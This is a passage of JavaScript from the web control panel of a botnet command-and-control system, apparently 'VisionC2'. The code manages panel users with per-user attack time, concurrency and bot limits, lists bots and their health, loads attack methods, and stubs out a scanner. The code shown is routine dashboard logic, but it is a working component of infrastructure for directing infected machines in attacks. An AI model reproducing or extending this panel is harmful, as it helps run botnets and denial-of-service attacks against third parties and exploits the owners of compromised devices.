    maxtime: maxtime,
    concurrents: concurrents,
    maxbots: maxbots,
    methods: methods
  };

  var method = editing ? 'PUT' : 'POST';
  fetch('/api/users', {
    method: method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast(editing ? 'User updated' : 'User created', true);
        hideUserForm();
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Request failed', false); });
}

function deleteUser(username) {
  if (!confirm('Delete user "' + username + '"?')) return;
  fetch('/api/users', {
    method: 'DELETE',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast('User deleted', true);
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Delete failed', false); });
}

// ---------------------------------------------------------------------------
// Theme toggle
// ---------------------------------------------------------------------------

function applyTheme(theme) {
  document.documentElement.setAttribute('data-theme', theme);
  var btn = document.getElementById('theme-toggle');
  if (btn) {
    btn.querySelector('.sun').style.display = theme === 'dark' ? 'none' : 'block';
    btn.querySelector('.moon').style.display = theme === 'dark' ? 'block' : 'none';
  }
}

function toggleTheme() {
  var current = document.documentElement.getAttribute('data-theme') || 'dark';
  var next = current === 'dark' ? 'light' : 'dark';
  applyTheme(next);
  try { localStorage.setItem('vision-theme', next); } catch (e) { }
}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

(function () {
  var saved = 'dark';
  try { saved = localStorage.getItem('vision-theme') || 'dark'; } catch (e) { }
  applyTheme(saved);
})();

updateArgFields();
updateTaskArgFields();
loadAttackMethods();

// Restore persisted UI state
(function () {
  // Compact mode
  if (lsGet('compact', false)) { toggleCompactMode(); }
  // Active tab
  var savedTab = lsGet('tab', null);
  if (savedTab) { var tb = document.querySelector('[data-tab="' + savedTab + '"]'); if (tb) switchTab(tb); }
  // Command bar collapsed
  if (lsGet('cmdCollapsed', false)) { toggleCmdBar(); }
  // Filters
  var savedFilters = lsGet('filters', null);
  if (savedFilters) { activeFilters = savedFilters; }
  // Search query
  var savedSearch = lsGet('search', '');
  if (savedSearch) { document.getElementById('bot-search').value = savedSearch; }
  // Notifications
  notifHistory = lsGet('notifs', []);
  notifUnseen = 0;
  renderNotifList();
})();

fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
fetch('/api/bots').then(function (r) { return r.json(); }).then(function (bots) {
  updateBots(bots);
  // Restore sort after first bot load
  var savedSort = lsGet('sort', null);
  if (savedSort && savedSort.field) {
    sortField = savedSort.field;
    sortAsc = !savedSort.asc; // sortBots toggles, so invert
    sortBots(savedSort.field);
  }
}).catch(function () { });
fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
connectSSE();

// Refresh health indicators every 10s (ago text + health dots go stale between SSE updates)
setInterval(function () {
  document.querySelectorAll('#bot-tbody tr.bot-row').forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id]; if (!b) return;
    var cells = r.getElementsByTagName('td');
    if (cells.length < 13) return;
    var h = botHealth(b.lastPing);
    cells[12].className = h.cls;
    cells[12].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
    r.className = 'bot-row ' + h.row;
  });
}, 10000);

// === Stubs for removed Armada features (not in VisionC2) ===
if(typeof loadTasks==='undefined')window.loadTasks=function(){};
if(typeof loadUsers==='undefined')window.loadUsers=function(){};
if(typeof scannerStart==='undefined')window.scannerStart=function(){};
if(typeof scannerStop==='undefined')window.scannerStop=function(){};
if(typeof addTask==='undefined')window.addTask=function(){};
if(typeof saveUser==='undefined')window.saveUser=function(){};
if(typeof showAddUserForm==='undefined')window.showAddUserForm=function(){};
if(typeof hideUserForm==='undefined')window.hideUserForm=function(){};
if(typeof updateTaskArgFields==='undefined')window.updateTaskArgFields=function(){};
